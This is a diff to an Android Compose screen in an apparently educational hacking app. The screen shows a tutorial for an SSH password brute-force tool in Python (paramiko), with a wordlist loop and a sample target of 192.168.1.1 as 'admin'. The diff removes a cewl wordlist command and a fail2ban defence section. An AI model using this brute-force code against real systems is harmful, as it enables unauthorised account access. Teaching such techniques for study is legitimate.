@@ -1,16 +1,23 @@
 package com.example.hackwithpython.projects
 
+import androidx.compose.foundation.horizontalScroll
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.text.BasicText
+import androidx.compose.foundation.text.selection.SelectionContainer
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Text
 import androidx.compose.material3.Button
 import androidx.compose.runtime.Composable
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.text.TextStyle
+import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
 import androidx.navigation.NavController
+import com.example.hackwithpython.HackerWhite
 
 @Composable
 fun Project5Screen(navController: NavController) {
@@ -65,10 +72,10 @@ fun Project5Screen(navController: NavController) {
                    ```bash
                    pip install paramiko
                    ```
-
-                2. **Setting Up SSH Connection**:
-                   Use the Paramiko library to attempt an SSH connection.
-                   ```python
+                """)
+        SelectionContainer {
+            BasicText(
+                text = """
                    import paramiko
 
                    def attempt_ssh_login(hostname, username, password):
@@ -83,45 +90,32 @@ fun Project5Screen(navController: NavController) {
                            return False
                        finally:
                            client.close()
-                   ```
-
-                3. **Brute Force Logic**:
-                   Load a wordlist and attempt SSH logins with each password in the wordlist.
-                   ```python
+                           
+                   # Load a wordlist and attempt SSH logins with each password in the wordlist.
                    def brute_force_ssh(hostname, username, wordlist_file):
                        with open(wordlist_file, "r") as file:
                            for password in file:
                                password = password.strip()
                                if attempt_ssh_login(hostname, username, password):
                                    break
-                   ```
-
-                4. **Testing the Tool**:
-                   Provide an SSH server IP, username, and a wordlist to test the brute force tool.
-                   ```python
+                                   
+                   # Provide an SSH server IP, username, and a wordlist to test the brute force tool.
                    hostname = "192.168.1.1"
                    username = "admin"
                    wordlist_file = "passwords.txt"
 
                    brute_force_ssh(hostname, username, wordlist_file)
-                   ```
-
-                5. **Generating Wordlists**:
-                   You can create or download wordlists for the brute force attack. Tools like `cewl` or `crunch` can help in generating wordlists.
-                   ```bash
-                   cewl http://example.com -m 5 -w wordlist.txt
-                   ```
-
-                6. **Protection Against Brute Force Attacks**:
-                   Discuss methods to protect against brute force attacks, such as rate limiting, using fail2ban, or disabling password authentication in favor of key-based authentication.
-                   ```bash
-                   sudo apt-get install fail2ban
-                   sudo systemctl enable fail2ban
-                   ```
-
+                
             """.trimIndent(),
-            modifier = Modifier.padding(vertical = 8.dp)
-        )
+                style = TextStyle(
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 14.sp,
+                    color = HackerWhite
+                ),
+                modifier = Modifier.padding(12.dp)
+                    .horizontalScroll(rememberScrollState())
+            )
+        }
 
         // Ethical Considerations Section
         Text(
